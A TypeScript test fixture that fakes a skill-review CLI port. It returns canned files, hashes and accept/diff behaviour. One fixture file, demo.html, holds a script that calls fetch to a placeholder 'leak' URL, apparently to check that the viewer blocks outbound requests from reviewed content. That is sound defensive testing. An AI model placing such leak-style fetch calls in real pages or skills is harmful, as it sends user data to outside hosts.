import { joinHostPath, type HostPath } from '../../shared/host-path'
import type { SkillagerReviewCliPort } from '../skillager/skillager-review-port'

/** Only the CLI boundary is synthetic; production owners, IPC and Chromium remain real. */
export function skillagerReviewFixture(
  root: HostPath,
  accepted: (id: string) => void,
): SkillagerReviewCliPort {
  const acceptedIds = new Set<string>()
  const history = { available: false, reason: 'no-git', versions: [] }
  return {
    history: () => Promise.resolve(history),
    review: (_selection, skillId) => {
      const bytes = new Map([
        [
          'SKILL.md',
          new TextEncoder().encode('# Reviewed skill\n\nInspect the supporting files.\n'),
        ],
        [
          'demo.html',
          new TextEncoder().encode(
            '<h1>Reviewed HTML</h1><script>document.body.dataset.reviewed = "yes";fetch("https://example.invalid/leak").catch(()=>document.body.dataset.blocked="yes")</script>',
          ),
        ],
        ['helper.sh', new TextEncoder().encode('#!/bin/sh\nprintf "reviewed\\n"\n')],
      ])
      return Promise.resolve({
        detail: {
          skillId,
          root: joinHostPath(root, skillId.slice(4)),
          hash: 'a'.repeat(64),
          files: [...bytes].map(([entry, data]) => ({
            entry,
            size: data.length,
            executable: entry === 'helper.sh',
          })),
          canAccept: !acceptedIds.has(skillId),
          scanRisk: 'low',
          lintStatus: 'ok',
          findings: [],
          history,
        },
        bytes,
        confirmationToken: 'fixture-private-token',
        dispose: () => {
          bytes.clear()
          return Promise.resolve()
        },
      })
    },
    diff: (_selection, _snapshot, fromHash) =>
      Promise.resolve({
        fromHash,
        toHash: 'a'.repeat(64),
        text: '- Old instructions\n+ Reviewed skill',
      }),
    accept: (_selection, snapshot) => {
      acceptedIds.add(snapshot.detail.skillId)
      accepted(snapshot.detail.skillId)
      return Promise.resolve({ status: 'accepted', hash: snapshot.detail.hash })
    },
  }
}
